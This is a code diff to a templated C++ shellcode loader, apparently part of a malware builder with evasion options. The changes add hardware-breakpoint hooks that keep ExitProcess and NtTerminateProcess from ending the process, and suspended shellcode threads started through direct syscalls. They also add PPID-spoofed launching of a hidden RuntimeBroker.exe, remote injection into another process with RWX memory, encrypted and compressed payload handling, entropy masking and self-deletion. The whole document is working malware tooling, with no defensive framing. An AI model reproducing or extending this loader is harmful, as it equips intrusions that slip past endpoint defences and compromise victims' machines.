@@ -11,6 +11,9 @@
 #include "common.hpp.in"
 #include "evasion.hpp.in"
 
+// Suspended shellcode thread handle — declared early so VM headers can reference it
+static HANDLE g_sc_thread = nullptr;
+
 {{#IF EXEC_VM}}
 #include "vm_ir.hpp.in"
 {{#ENDIF}}
@@ -19,6 +22,10 @@
 {{#ENDIF}}
 
 {{JUNK_CODE_BLOCKS}}
+
+#ifndef THREAD_CREATE_FLAGS_CREATE_SUSPENDED
+#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001
+#endif
 
 // Encrypted payload
 {{ENCRYPTED_PAYLOAD}}
@@ -62,6 +69,78 @@ static VOID CALLBACK fiber_trampoline(LPVOID param) {
     ctx->pSF(ctx->mainFiber);
 }
 {{#ENDIF}}
+
+// HWBP-based ExitProcess interception
+static void* g_exit_process_addr = nullptr;
+static void* g_nttp_addr = nullptr;
+static void* g_exit_thread_addr = nullptr;
+static PVOID g_nttp_veh = nullptr;
+
+static LONG CALLBACK exit_hwbp_handler(PEXCEPTION_POINTERS exc) {
+    if (exc->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
+        void* addr = exc->ExceptionRecord->ExceptionAddress;
+        if (addr == g_exit_process_addr || addr == g_nttp_addr) {
+            // Redirect ExitProcess(code) or NtTerminateProcess(handle, code) to RtlExitUserThread
+            if (addr == g_exit_process_addr) {
+                // ExitProcess(UINT uExitCode) — RCX = exit code
+                exc->ContextRecord->Rip = (DWORD64)g_exit_thread_addr;
+                // RCX already has the exit code for RtlExitUserThread
+            } else {
+                // NtTerminateProcess(HANDLE, NTSTATUS) — only intercept process-wide
+                HANDLE ph = (HANDLE)exc->ContextRecord->Rcx;
+                if (ph == NULL || ph == (HANDLE)-1) {
+                    exc->ContextRecord->Rip = (DWORD64)g_exit_thread_addr;
+                    exc->ContextRecord->Rcx = exc->ContextRecord->Rdx;
+                }
+            }
+            exc->ContextRecord->EFlags |= (1 << 16); // RF
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+static void setup_terminate_guard() {
+    HMODULE ntdll = resolve_module(HASHA("NTDLL.DLL"));
+    if (!ntdll) return;
+    HMODULE kernel32 = resolve_module(HASHA("KERNEL32.DLL"));
+    if (!kernel32) return;
+
+    g_exit_process_addr = (void*)resolve_function(kernel32, HASHA("ExitProcess"));
+    g_nttp_addr = (void*)resolve_function(ntdll, HASHA("NtTerminateProcess"));
+    g_exit_thread_addr = (void*)resolve_function(ntdll, HASHA("RtlExitUserThread"));
+    if (!g_exit_thread_addr) return;
+
+    using AddVEH_t = PVOID(WINAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER);
+    auto pAddVEH = reinterpret_cast<AddVEH_t>(
+        resolve_function(kernel32, HASHA("AddVectoredExceptionHandler")));
+    if (!pAddVEH) return;
+    g_nttp_veh = pAddVEH(1, exit_hwbp_handler);
+}
+
+static void arm_terminate_hwbp(HANDLE hThread) {
+    using NtGetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
+    using NtSetContextThread_t = NTSTATUS(NTAPI*)(HANDLE, PCONTEXT);
+    auto NtGCT = get_syscall_fn<NtGetContextThread_t>(HASH_NtGetContextThread);
+    auto NtSCT = get_syscall_fn<NtSetContextThread_t>(HASH_NtSetContextThread);
+    if (!NtGCT || !NtSCT) return;
+
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    NtGCT(hThread, &ctx);
+    // DR2 = ExitProcess, DR3 = NtTerminateProcess
+    if (g_exit_process_addr) {
+        ctx.Dr2 = reinterpret_cast<DWORD_PTR>(g_exit_process_addr);
+        ctx.Dr7 |= (1 << 4);       // enable DR2
+        ctx.Dr7 &= ~(3 << 24);     // execution
+    }
+    if (g_nttp_addr) {
+        ctx.Dr3 = reinterpret_cast<DWORD_PTR>(g_nttp_addr);
+        ctx.Dr7 |= (1 << 6);       // enable DR3
+        ctx.Dr7 &= ~(3 << 28);     // execution
+    }
+    NtSCT(hThread, &ctx);
+}
 
 {{#IF LOCAL_INJECT}}
 static void execute_local() {
@@ -177,8 +256,8 @@ static void execute_local() {
 
 {{#IF EXEC_RISCVM}}
     {
-        uint8_t rv_code[] = { {{VM_RV_BLOB}} };
-        vm_riscv_execute(shellcode, shellcode_len, rv_code, sizeof(rv_code),
+        uint8_t rv_blob[] = { {{VM_RV_BLOB}} };
+        vm_riscv_execute(shellcode, shellcode_len, rv_blob, sizeof(rv_blob),
                          {{VM_RV_SEED}}, {{VM_RV_XOR_KEY}});
     }
     SecureZeroMemory(decrypted, sizeof(decrypted));
@@ -252,7 +331,7 @@ static void execute_local() {
         exec_addr = stomp_addr;
         pa = stomp_addr;
         ps = stomp_size;
-        NtPVM(hProc, &pa, &ps, op, &op);
+        NtPVM(hProc, &pa, &ps, PAGE_EXECUTE_READWRITE, &op);
     }
 {{#ENDIF}}
 
@@ -289,26 +368,7 @@ static void execute_local() {
 
     {
         ULONG old_prot;
-        NtPVM(hProc, &base_addr, &region_size, PAGE_EXECUTE_READ, &old_prot);
-    }
-{{#ENDIF}}
-
-{{#IF EXEC_DIRECT}}
-    auto fn = reinterpret_cast<void(*)()>(exec_addr);
-    fn();
-{{#ENDIF}}
-
-{{#IF EXEC_THREAD}}
-    {
-        HANDLE hThread = nullptr;
-        auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
-        if (!NtCTE) return;
-        NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hProc, exec_addr,
-              NULL, 0, 0, 0, 0, NULL);
-        if (hThread) {
-            auto NtWFSO = get_syscall_fn<NtWaitForSingleObject_t>(HASH_NtWaitForSingleObject);
-            if (NtWFSO) NtWFSO(hThread, FALSE, NULL);
-        }
+        NtPVM(hProc, &base_addr, &region_size, PAGE_EXECUTE_READWRITE, &old_prot);
     }
 {{#ENDIF}}
 
@@ -353,8 +413,23 @@ static void execute_local() {
         LPVOID scFiber = pCF(0, fiber_trampoline, &g_fiber_ctx);
         if (!scFiber) { if (pCFT) pCFT(); return; }
         pSF(scFiber);
-        // Don't DeleteFiber - shellcode threads may reference fiber stack data
         if (pCFT) pCFT();
+    }
+{{#ENDIF}}
+
+{{#IF EXEC_THREAD}}
+    {
+        auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
+        if (NtCTE) NtCTE(&g_sc_thread, THREAD_ALL_ACCESS, NULL, hProc,
+                         exec_addr, NULL, 0x1, 0, 0, 0, NULL);
+    }
+{{#ENDIF}}
+
+{{#IF EXEC_DIRECT}}
+    {
+        auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
+        if (NtCTE) NtCTE(&g_sc_thread, THREAD_ALL_ACCESS, NULL, hProc,
+                         exec_addr, NULL, 0x1, 0, 0, 0, NULL);
     }
 {{#ENDIF}}
 
@@ -377,10 +452,9 @@ static void execute_local() {
 
 {{#IF REMOTE_INJECT}}
 static void execute_remote() {
-    // Find/create target process
     DWORD target_pid = 0;
+    HANDLE hChildThread = nullptr;
 
-    // Snapshot processes to find target
     using CreateToolhelp32Snapshot_t = HANDLE(WINAPI*)(DWORD, DWORD);
     using Process32FirstW_t = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
     using Process32NextW_t = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
@@ -402,7 +476,6 @@ static void execute_remote() {
     pe.dwSize = sizeof(pe);
     if (pFirst(hSnap, &pe)) {
         do {
-            // Compare with target process name
             const wchar_t* target = obf_wide(L"{{TARGET_PROCESS}}");
             if (lstrcmpiW(pe.szExeFile, target) == 0) {
                 target_pid = pe.th32ProcessID;
@@ -415,7 +488,6 @@ static void execute_remote() {
     if (target_pid == 0) return;
 
 {{#IF PPID_SPOOF}}
-    // PPID spoofing - create suspended process with spoofed parent
     {
         DWORD parent_pid = 0;
         HANDLE hParentSnap = pSnap(0x2, 0);
@@ -461,11 +533,12 @@ static void execute_remote() {
                         &policy, sizeof(policy), NULL, NULL);
 {{#ENDIF}}
 
-                    wchar_t cmd[] = L"{{TARGET_PROCESS}}";
+                    wchar_t cmd[] = L"C:\\Windows\\System32\\RuntimeBroker.exe";
                     if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
-                            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
+                            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
                             NULL, NULL, &si.StartupInfo, &pi)) {
                         target_pid = pi.dwProcessId;
+                        hChildThread = pi.hThread;
                     }
                     DeleteProcThreadAttributeList(si.lpAttributeList);
                     HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
@@ -490,14 +563,18 @@ static void execute_remote() {
     NtOP(&hTarget, PROCESS_ALL_ACCESS, &oa, &cid);
     if (!hTarget) return;
 
-    // Decode + decrypt payload (same as local)
+{{#IF ENTROPY_REDUCE}}
+    for (size_t i = 0; i < payload_len; i++)
+        payload[i] ^= entropy_mask[i];
+{{#ENDIF}}
+
+    // Decode + decrypt payload
     uint8_t* encrypted = nullptr;
     size_t encrypted_len = 0;
 {{#IF ENCODE_NONE}}
     encrypted = payload;
     encrypted_len = payload_len;
 {{#ENDIF}}
-    // (other encoding paths same as local)
 
     uint8_t decrypted[{{PAYLOAD_SIZE}} + 256];
     size_t decrypted_len = sizeof(decrypted);
@@ -505,7 +582,39 @@ static void execute_remote() {
 
     uint8_t* shellcode = decrypted;
     size_t shellcode_len = decrypted_len;
-    // (decompression same as local)
+
+{{#IF COMPRESS_ZLIB}}
+    uint8_t decompressed[ORIGINAL_SIZE + 256];
+    size_t decompressed_len = sizeof(decompressed);
+    if (!decompress_zlib(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
+        return;
+    shellcode = decompressed;
+    shellcode_len = decompressed_len;
+{{#ENDIF}}
+{{#IF COMPRESS_LZ4}}
+    uint8_t decompressed[ORIGINAL_SIZE + 256];
+    size_t decompressed_len = sizeof(decompressed);
+    if (!decompress_lz4(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
+        return;
+    shellcode = decompressed;
+    shellcode_len = decompressed_len;
+{{#ENDIF}}
+{{#IF COMPRESS_RLE}}
+    uint8_t decompressed[ORIGINAL_SIZE + 256];
+    size_t decompressed_len = sizeof(decompressed);
+    if (!decompress_rle(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
+        return;
+    shellcode = decompressed;
+    shellcode_len = decompressed_len;
+{{#ENDIF}}
+{{#IF COMPRESS_LZNT}}
+    uint8_t decompressed[ORIGINAL_SIZE + 256];
+    size_t decompressed_len = sizeof(decompressed);
+    if (!decompress_lznt(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len))
+        return;
+    shellcode = decompressed;
+    shellcode_len = decompressed_len;
+{{#ENDIF}}
 
     // Remote allocation
     PVOID remote_addr = nullptr;
@@ -515,30 +624,44 @@ static void execute_remote() {
     NtAVM(hTarget, &remote_addr, 0, &remote_size,
           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    // Write shellcode
     auto NtWVM = get_syscall_fn<NtWriteVirtualMemory_t>(HASH_NtWriteVirtualMemory);
     SIZE_T written = 0;
     NtWVM(hTarget, remote_addr, shellcode, shellcode_len, &written);
 
-    // Change protection
     ULONG old_prot;
     auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
-    NtPVM(hTarget, &remote_addr, &remote_size, PAGE_EXECUTE_READ, &old_prot);
+    NtPVM(hTarget, &remote_addr, &remote_size, PAGE_EXECUTE_READWRITE, &old_prot);
 
-    // Create remote thread
+{{#IF PPID_SPOOF}}
+    // Resume child's main thread for initialization, wait, then suspend
+    if (hChildThread) {
+        auto NtRT = get_syscall_fn<NtResumeThread_t>(HASH_NtResumeThread);
+        if (NtRT) NtRT(hChildThread, NULL);
+
+        auto NtDE = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
+        LARGE_INTEGER dw;
+        dw.QuadPart = -10000LL * 2000;
+        if (NtDE) NtDE(FALSE, &dw);
+
+        auto NtST = get_syscall_fn<NtSuspendThread_t>(HASH_NtSuspendThread);
+        if (NtST) NtST(hChildThread, NULL);
+    }
+{{#ENDIF}}
+
+    // Create remote thread for shellcode
     HANDLE hThread = nullptr;
     auto NtCTE = get_syscall_fn<NtCreateThreadEx_t>(HASH_NtCreateThreadEx);
     NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hTarget, remote_addr,
           NULL, 0, 0, 0, 0, NULL);
 
-    if (hThread) {
-        auto NtWFSO = get_syscall_fn<NtWaitForSingleObject_t>(HASH_NtWaitForSingleObject);
-        NtWFSO(hThread, FALSE, NULL);
-        auto NtCl = get_syscall_fn<NtClose_t>(HASH_NtClose);
-        NtCl(hThread);
-    }
     auto NtCl = get_syscall_fn<NtClose_t>(HASH_NtClose);
-    NtCl(hTarget);
+    if (hThread) {
+        if (NtCl) NtCl(hThread);
+    }
+    if (hChildThread) {
+        if (NtCl) NtCl(hChildThread);
+    }
+    if (NtCl) NtCl(hTarget);
 
     SecureZeroMemory(decrypted, sizeof(decrypted));
 }
@@ -594,12 +717,21 @@ int main() {
     self_delete();
 {{#ENDIF}}
 
+    setup_terminate_guard();
+
 {{#IF LOCAL_INJECT}}
     execute_local();
 {{#ENDIF}}
 {{#IF REMOTE_INJECT}}
     execute_remote();
 {{#ENDIF}}
+
+    // Arm HWBP on shellcode thread and resume
+    if (g_sc_thread) {
+        arm_terminate_hwbp(g_sc_thread);
+        auto NtRThread = get_syscall_fn<NtResumeThread_t>(HASH_NtResumeThread);
+        if (NtRThread) NtRThread(g_sc_thread, NULL);
+    }
 
     // Keep process alive for shellcode that spawns threads (staged payloads)
     LARGE_INTEGER wait;
